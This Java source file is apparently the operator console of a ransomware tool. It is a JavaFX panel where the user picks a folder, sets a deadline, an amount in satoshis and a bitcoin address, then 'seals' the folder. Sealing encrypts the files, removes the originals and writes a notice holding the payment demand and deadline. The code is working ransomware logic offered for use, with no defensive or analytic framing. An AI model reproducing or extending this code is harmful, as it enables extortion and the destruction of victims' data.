package com.ztsec.ghost;

import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Priority;
import javafx.scene.layout.Region;
import javafx.scene.layout.VBox;
import javafx.stage.DirectoryChooser;

import java.io.File;
import java.nio.file.Path;
import java.util.UUID;
import java.util.function.Consumer;

/** Pre-lockdown console: pick a root, preview the pass, arm and seal. */
public final class SweepPanel extends VBox {
    private final TextField rootField = new TextField();
    private final TextField hoursField = new TextField("24");
    private final TextField priceField = new TextField("150000 sats");
    private final TextField addressField = new TextField("bc1q-address-here");
    private final Label preview = new Label("No folder selected.");
    private final Button seal = new Button("SEAL");
    private final Label status = new Label();
    private final Consumer<String[]> onArm;

    public SweepPanel(Consumer<String[]> onArm) {
        this.onArm = onArm;
        setPadding(new Insets(24));
        setSpacing(14);

        Label title = new Label("SWEEP");
        title.setStyle("-fx-text-fill: " + Theme.INK
                + "; -fx-font-family: 'monospace'; -fx-font-size: 16px; -fx-font-weight: bold;");
        Label sub = new Label("Originals are removed only after the sealed copy verifies.");
        Theme.caption(sub);

        rootField.setPromptText("C:\\path\\to\\folder");
        rootField.setStyle("-fx-background-color: " + Theme.PANEL + "; -fx-text-fill: " + Theme.INK
                + "; -fx-border-color: " + Theme.LINE + "; -fx-font-family: 'monospace'; -fx-padding: 9;");
        HBox.setHgrow(rootField, Priority.ALWAYS);

        Button browse = new Button("BROWSE");
        Theme.secondary(browse);
        browse.setOnAction(e -> {
            DirectoryChooser chooser = new DirectoryChooser();
            File chosen = chooser.showDialog(getScene().getWindow());
            if (chosen != null) {
                rootField.setText(chosen.getAbsolutePath());
                plan(Path.of(chosen.getAbsolutePath()));
            }
        });

        HBox rootRow = new HBox(10, rootField, browse);
        rootRow.setAlignment(Pos.CENTER_LEFT);

        HBox options = new HBox(10,
                field("WINDOW (HOURS)", hoursField),
                field("AMOUNT", priceField),
                field("ADDRESS", addressField));

        preview.setStyle("-fx-text-fill: " + Theme.MUTE + "; -fx-font-family: 'monospace'; -fx-font-size: 12px;");

        Theme.primary(seal);
        seal.setDisable(true);
        seal.setOnAction(e -> runSeal());

        status.setStyle("-fx-text-fill: " + Theme.MUTE + "; -fx-font-family: 'monospace'; -fx-font-size: 12px;");
        status.setWrapText(true);

        Region grow = new Region();
        VBox.setVgrow(grow, Priority.ALWAYS);

        getChildren().addAll(title, sub, rootRow, options, preview, seal, status, grow);
    }

    private VBox field(String caption, TextField input) {
        Label label = new Label(caption);
        Theme.caption(label);
        input.setStyle("-fx-background-color: " + Theme.PANEL + "; -fx-text-fill: " + Theme.INK
                + "; -fx-border-color: " + Theme.LINE + "; -fx-font-family: 'monospace'; -fx-padding: 9;");
        VBox box = new VBox(6, label, input);
        HBox.setHgrow(box, Priority.ALWAYS);
        return box;
    }

    private void plan(Path root) {
        try {
            Seal.Plan plan = new Seal().plan(root);
            preview.setText(plan.files().size() + " files, " + (plan.bytes() / 1_048_576)
                    + " MB, " + plan.skipped().size() + " skipped");
            seal.setDisable(plan.files().isEmpty());
        } catch (Exception e) {
            preview.setText(e.getMessage());
            seal.setDisable(true);
        }
    }

    private void runSeal() {
        Path root = Path.of(rootField.getText().trim());
        int hours = Math.max(1, Integer.parseInt(hoursField.getText().trim().replaceAll("\\D", "")));
        String amount = priceField.getText().trim();
        String address = addressField.getText().trim();
        String caseId = UUID.randomUUID().toString().substring(0, 8).toUpperCase();

        seal.setDisable(true);
        status.setText("sealing...");

        Thread worker = new Thread(() -> {
            try {
                CaseLedger ledger = CaseLedger.create(root, caseId, root.getFileName().toString());
                ledger.state(CaseState.ARMED);
                ArmTimer timer = ArmTimer.hoursFromNow(hours);
                ledger.put("deadline", timer.deadline().toString());
                ledger.put("amount", amount);
                ledger.put("address", address);
                ledger.save();

                Seal.Plan plan = new Seal().plan(root);
                MasterKey master = MasterKey.generate();
                ledger.put("fileCount", plan.files().size());
                ledger.put("bytes", plan.bytes());
                ledger.state(CaseState.SEALED);

                new Seal().seal(plan, master, (done, total) ->
                        javafx.application.Platform.runLater(() -> status.setText("sealing " + done + "/" + total)));

                String code = master.recoveryCode();
                ledger.put("recoveryCode", code);
                ledger.save();
                NoticeFile.write(root, caseId, plan.files().size(), plan.bytes(), timer.remaining(), amount, address);

                javafx.application.Platform.runLater(() -> {
                    status.setText("sealed. code: " + code);
                    onArm.accept(new String[]{caseId, amount, address, code});
                });
            } catch (Exception e) {
                javafx.application.Platform.runLater(() -> {
                    status.setText("failed: " + e.getMessage());
                    seal.setDisable(false);
                });
            }
        }, "sweep");
        worker.setDaemon(true);
        worker.start();
    }
}
